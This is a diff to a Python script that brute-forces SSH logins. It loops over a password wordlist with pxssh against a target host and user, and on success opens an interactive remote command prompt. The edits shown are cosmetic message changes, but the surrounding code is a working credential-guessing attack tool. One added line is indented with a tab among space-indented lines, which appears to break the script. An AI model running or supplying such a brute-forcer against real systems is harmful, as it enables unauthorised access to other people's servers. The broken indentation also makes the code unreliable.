@@ -15,7 +15,7 @@ try:
 	print (bcolors.OKGREEN + file1.read() + bcolors.ENDC)
 	file1.close()
 except IOError:
-	print('\nBanner File not found!')
+	print('Banner File not found!\n')
 
 
 def connect (target, username, passwd):
@@ -25,13 +25,14 @@ def connect (target, username, passwd):
     try:
         s = pxssh.pxssh()
         s.login(target, username, passwd)
-        print("Password Found :D")
+        print("Password Found :D\n")
         print("Password is: " + passwd)
+	print("\n")
         return s
 
     except Exception as e:
         if (fails > 5):
-            print ("Too many Socket Timeouts :(")
+            print ("[-] Too many Socket Timeouts :(")
             exit(0)
         elif 'read_nonblocking' in str(e):
             fails += 1
@@ -57,11 +58,11 @@ def Main():
     if (target and username and wordlist):
         with open(wordlist, 'r') as passfile:
             for passwd in passfile:
-                print("Testing: " + passwd)
+                print("[-] Trying: " + passwd)
                 con = connect(target, username, passwd)
                 if con:
                     flag = 1
-                    print("SSH Connected")
+                    print("[+] SSH Connected\n")
                     print("Press (q or Q) to Quit")
                     command = input(">")
                     while (command != 'q' and command != 'Q'):
@@ -74,8 +75,8 @@ def Main():
         exit(0)
 
     if (flag == 0):
-        print("Password not found :(")
-        print("Please modify your wordlist !")
+        print("Password not found :(\n")
+        print("Please modify your wordlist !\n")
 
 if __name__=='__main__':
     Main()
